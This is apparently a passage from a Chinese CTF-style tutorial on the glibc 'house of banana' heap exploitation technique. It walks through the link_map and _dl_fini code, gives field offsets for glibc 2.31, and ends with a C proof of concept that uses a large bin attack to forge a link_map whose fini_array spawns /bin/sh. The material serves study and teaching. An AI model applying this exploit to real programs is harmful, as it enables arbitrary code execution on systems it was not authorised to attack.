*/</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">r_scope_elem</span> *_ns_main_searchlist;</span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Once libc.so has been loaded into the namespace, this points to</span></span><br><span class="line"><span class="comment">       its link map.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *libc_map;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">unique_sym_table</span></span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">unique_sym</span></span><br><span class="line">      &#123;</span><br><span class="line">    <span class="type">uint32_t</span> hashval;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">link_map</span> *map;</span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="type">size_t</span> size;</span><br><span class="line">      <span class="type">size_t</span> n_elements;</span><br><span class="line">      <span class="built_in">void</span> (*free) (<span class="type">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">r_debug</span> _ns_debug;</span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中有多个<code>_dl_ns</code>结构体，调试发现，该结构体存储着的实际就是elf各段的符号结构体</p>
<p>类似于IDA中的段结构体</p>
<p>继续之后的学习还会遇见以下几个结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> *l_phdr;	<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;		<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;		<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;		<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>			/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	lt_executable,		<span class="comment">/* The main executable program.  */</span></span><br><span class="line">	lt_library,		<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">	lt_loaded		<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    ............以下还有不少,在这里不是很重要</span><br><span class="line">   <span class="comment">//在 C 语言中，变量声明后加:1 表示该变量是一个位域（bit-field）。位域允许将一个整数类型的数据分割为多个较小的位字段，以便更有效地使用内存。&quot;:1&quot; 表示该位域的宽度为 1 位。这意味着该变量只能存储一个位的值，即 0 或 1。</span></span><br><span class="line">        <span class="comment">//l_init_called变量在这里是第四个位域</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ptype Elf64_Dyn</span><br><span class="line">type = <span class="keyword">struct</span> &#123;</span><br><span class="line">    Elf64_Sxword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf64_Xword d_val;<span class="comment">//union结构体只取其一</span></span><br><span class="line">        Elf64_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p>这些个结构体在退出时会被dl_fini调用[glibc/elf/dl_fini.c]</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">      <span class="comment">//大多数时候dl_nns都是1,也就是这个循环只执行一次,ns==0</span></span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          <span class="comment">//nloaded通常为4</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">	</span><br><span class="line">	    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">	      &#123;</span><br><span class="line">		assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br><span class="line">	  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">          <span class="comment">//因为ns==0,所以必须i==4,也就是上面的循环要执行四次</span></span><br><span class="line">	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">			 <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)<span class="comment">//l-&gt;l_init_called字段需要大于0</span></span><br><span class="line">		&#123;</span><br><span class="line">		</span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">		    &#123;</span><br><span class="line">	</span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line"></span><br><span class="line">		 </span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">			    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="keyword">sizeof</span> (ElfW(Addr)));<span class="comment">//sizeof==8</span></span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)<span class="comment">//i最少要为1</span></span><br><span class="line">			    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();<span class="comment">//!!注意此时的i已经--了</span></span><br><span class="line">			&#125;</span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">    <span class="comment">//后半部分在2.37以后由一个函数实现,不过实现逻辑并未改变,不影响该利用方法</span></span><br><span class="line">    <span class="type">void</span></span><br><span class="line">_dl_call_fini (<span class="type">void</span> *closure_map)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span> =</span> closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, <span class="built_in">map</span>-&gt;l_name, <span class="built_in">map</span>-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  <span class="built_in">map</span>-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  ElfW(Dyn) *fini_array = <span class="built_in">map</span>-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (<span class="built_in">map</span>-&gt;l_addr</span><br><span class="line">                                          + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">      <span class="type">size_t</span> sz = (<span class="built_in">map</span>-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                   / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="type">fini_t</span>) <span class="built_in">array</span>[sz]) ();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>函数只截取到最终利用的地方<code>((fini_t) array[i]) ();</code></p>
<p>因此，可以利用large bin attack劫持rtld_global的_ns_loaded指针,使其指向一片可控的区域(例如堆)，并事先在可控区域里伪造好link_map结构体，这样程序exit或者正常退出main函数时，便会执行到伪造的fini_array数组。</p>
<p>此外最终执行的<code>array[i]) ()</code>其在一个while循环中，所以只要把i构造恰当，那么就可完成些不太严谨的ROP。</p>
<p>偏移表(2.31)不同libc版本会有差异</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>偏移</th>
<th>字段</th>
</tr>
</thead>
<tbody>
<tr>
<td>+0</td>
<td>l_addr</td>
</tr>
<tr>
<td>+0x18</td>
<td>l_next</td>
</tr>
<tr>
<td>+0x28</td>
<td>l_real</td>
</tr>
<tr>
<td>+0x110</td>
<td>l_info[DT_FINI_ARRAY]</td>
</tr>
<tr>
<td>+0x120</td>
<td>l_info[DT_FINI_ARRAYSZ]</td>
</tr>
<tr>
<td>+0x31c位域倒数第四位</td>
<td>l_init_called</td>
</tr>
</tbody>
</table>
</div>
<p>有四个思路</p>
<ul>
<li>思路1:直接劫持(_rtld_global._dl_ns[0]._ns_loaded)，布局好其他内容，使其调用到 fini_array</li>
<li>思路2:伪造(_rtld_global._dl_ns[0]._ns_loaded) 的 第三个next 指针，布局好其他内容，使其调用到 fini_array</li>
<li>思路3:直接劫持(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[26&amp;&amp;28],l_info[26]控制d_ptr,l_info[28]的d_val字段得大于8(实际上是不可控的size字段,必然满足条件),且d_ptr受到d_val和l_addr影响</li>
<li>思路4:修改 link_map-&gt;l_addr，根据偏移使其调用到指定区域的函数,可行性不大,因为largebin_attack只能够使l_addr修改为堆地址,<strong>除非在某些特殊情况能够做到任意写l_addr</strong></li>
</ul>
<h2 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h2><p>需要根据环境需要修改偏移，在有些情况下，rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移。</p>
<h3 id="思路1-poc"><a href="#思路1-poc" class="headerlink" title="思路1-poc:"></a>思路1-poc:</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;you hacked me!!&quot;</span>);</span><br><span class="line">   <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">   <span class="type">size_t</span> libc_base = &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">   <span class="type">size_t</span> _rtld_global_ptr_addr = libc_base + <span class="number">0x23a060</span>;</span><br><span class="line">   <span class="type">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">free</span>(ptr0);</span><br><span class="line">   <span class="comment">//put ptr9 into large bin</span></span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">   <span class="built_in">free</span>(ptr1); <span class="comment">//free ptr1 into unsorted bin</span></span><br><span class="line">   <span class="built_in">free</span>(ptr2); <span class="comment">//free ptr2 into unsorted bin</span></span><br><span class="line">   <span class="comment">//bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_addr - <span class="number">0x20</span>;</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x410</span>); <span class="comment">//large bin attack to  hijack _rtld_global_ptr</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//fake a _rtld_global</span></span><br><span class="line">   <span class="type">size_t</span> fake_rtld_global_addr = ptr1 - <span class="number">0x10</span>;</span><br><span class="line">   <span class="type">size_t</span> *fake_rtld_global = (<span class="type">size_t</span> *)ptr1;</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">   <span class="comment">//the chain&#x27;s length must &gt;= 4</span></span><br><span class="line">   fake_rtld_global[<span class="number">1</span>] = &amp;fake_rtld_global[<span class="number">2</span>];<span class="comment">//l_next</span></span><br><span class="line">   fake_rtld_global[<span class="number">3</span>] = fake_rtld_global_addr;<span class="comment">//l_real</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">8</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">3</span>] = <span class="number">0</span>;                    <span class="comment">//这一块都是在伪造next的接下来三次遍历</span></span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">8</span>];<span class="comment">//为什么不指向自己绕过,因为退出的条件时l==NULL</span></span><br><span class="line">												<span class="comment">//如果指向自己那就永远无法退出了</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">   <span class="comment">//fake a fini_array segment</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x20</span>] = &amp;fake_rtld_global[<span class="number">0x30</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x22</span>] = &amp;fake_rtld_global[<span class="number">0x23</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x23</span>+<span class="number">1</span>] = <span class="number">0x8</span>; <span class="comment">//func ptrs total len</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">0x30</span>] = <span class="number">0x1A</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">0x31</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">-2</span>] = &amp;fake_rtld_global[<span class="number">0x32</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//funcs</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x32</span>] = backdoor;</span><br><span class="line"><span class="comment">//布置l_info[26]和l_info[28]指向的Elf64_Dyn结构体</span></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">0x61</span>] = <span class="number">0x800000000</span>;<span class="comment">//l_init_call,为什么这样设置参考上面的位域声明</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
